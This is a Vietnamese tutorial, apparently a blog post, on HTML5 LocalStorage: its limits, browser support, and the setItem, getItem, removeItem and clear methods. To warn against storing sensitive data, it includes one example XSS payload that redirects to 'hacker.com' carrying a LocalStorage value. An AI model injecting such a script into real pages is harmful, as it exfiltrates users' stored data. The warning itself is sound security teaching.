# Local Storage là gì?
Tương tự như cookie, HTML5 hỗ trợ LocalStorage là một loại lưu trữ web cho phép các trang web và ứng dụng Javascript lưu trữ và truy cập dữ liệu ngay trong trình duyệt mà không có ngày hết hạn. 
Hay dữ liệu được lưu trữ trong trình duyệt sẽ tồn tại ngay cả sau khi cửa sổ trình duyệt đã bị đóng, Dữ liệu chỉ mất khi bạn sử dụng chức năng clear history của trình duyệt, hoặc bạn sử dụng localStorage API để xóa
# Hạn chế của LocalStorage
- Thông tin trong LocalStorage chỉ được lưu trữ trong trình duyệt của người dùng (Không lưu trên server) , localStorage được sandbox theo domain name của ứng dụng web. Hay nói cách khác mỗi trang web sẽ có 1 LocalStorage riêng và không thể truy cập đến LocalStorage khác. Đây có thể xem là ưu điểm cũng có thể là nhược điểm của LocalStorage.
- Không nên lưu các dữ liệu nhạy cảm của người dùng vào LocalStorage:
LocalStorage chỉ được lưu ở phía client nên có thể có 1 số lỗi bảo mật mà hacker có thể tận dụng để lấy ra dữ liệu của người dùng từ Local Storage như Cross Site Scripting (XSS), DNS spoofing attacks.
VD: Thông qua field input của trang, hacker có thể nhập vào 1 đoạn mã script như `<script>window.location="http://hacker.com?cookie=" + localStorage.getItem('sensitive-data');</script>` Từ đó có thể lấy ra dữ liệu của người dùng được lưu trong LocalStorage.
- Các trình duyệt hỗ trợ:

    | Trình duyệt |  Chrome (4.0+)  |  Firefox (3.5)  |  Safari (4.0)  |  IE (8.0+) 
    | -------- | -------- | -------- | -------- | -------- | -------- |
    | LocalStorage | 10MB | 10MB | 5MB  | 10MB

        - Ngoài ra ta có thể kiểm tra trình duyệt có hỗ trợ localStorage bằng cách:
        ```
        if (storageAvailable('localStorage')) {
            // Trình duyệt này hỗ trợ LocalStorage
        }
        else {
            // :( trình duyệt không hỗ trợ LocalStorage
        }
        ```
# Kiểm tra LocalStorage
Thông qua dev tool ta có thể vào tab Application và kiểm tra Local Storage của trang hiện tại ( Chrome)
![](https://images.viblo.asia/63c4c5aa-6f3a-4a21-a87c-1eeb94bf3f79.png)
# Sử dụng LocalStorage với JavaScript
- Để sử dụng LocalStorage, ta sẽ có 4 method chính:
setItem():  Gán dữ liệu vào LocalStorage
getItem(): Lấy ra dữ liệu từ LocalStorage
removeItem(): Xóa dữ liệu khỏi LocalStorage
clear(): Xóa toàn bộ dữ liệu của LocalStorage
### 1. setItem()
- Để gán 1 biến nào đó vào LocalStorage ta chỉ cần dùng lệnh: `window.localStorage.setItem('key', 'value')`
- Với key là tên biến để ta truy xuất và value là giá trị biến truyền vào.
- Chú ý: LocalStorage chỉ cho phép chúng ta lưu biến với kiểu String, vì vậy để lưu Object hoặc Array ta có thể convert sang Json.
```
localStorage.setItem('list_departments', JSON.stringify([1,2]))
```
- Khi cần sử dụng chỉ cần JSON.parse() để convert về giá trị ban đầu.
### 2. getItem()
- Để lấy ra được dữ liệu trong localStorage của trình duyệt ta dùng method:
`window.localStorage.getItem('key');`
### 3. removeItem()
- Để xóa 1 item khỏi localStorage ta sẽ sử dụng method: removeItem()
```
window.localStorage.removeItem('key')
```
### 4. clear()
- Để xóa toàn bộ các dữ liệu trong LocalStorage của domain hiện tại.
```
window.localStorage.clear();
```
# Tổng kết:
Thông qua bài viết mình mong rằng mọi người có thể có cái nhìn tổng quát về Local Storage cũng như các kiến thức cơ bản để có thể sử dụng Locak Storage đúng cách.
M.n nếu thắc mắc, góp ý hoặc chia sẽ thêm những kiến thức liên quan có thể comment bên dưới nhé. Cảm ơn các bạn đã đọc.